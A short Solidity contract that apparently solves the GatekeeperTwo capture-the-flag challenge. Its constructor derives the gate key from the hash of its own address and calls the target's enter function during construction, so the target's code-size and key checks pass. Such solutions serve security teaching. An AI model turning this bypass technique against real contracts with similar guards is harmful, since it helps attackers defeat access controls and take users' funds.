// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solution {
    constructor(address gatekeeperTwo) {
        bytes8 _gateKey = ~bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))));

        (bool success, ) = gatekeeperTwo.call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );

        require(success == true, "Call failed");
    }
}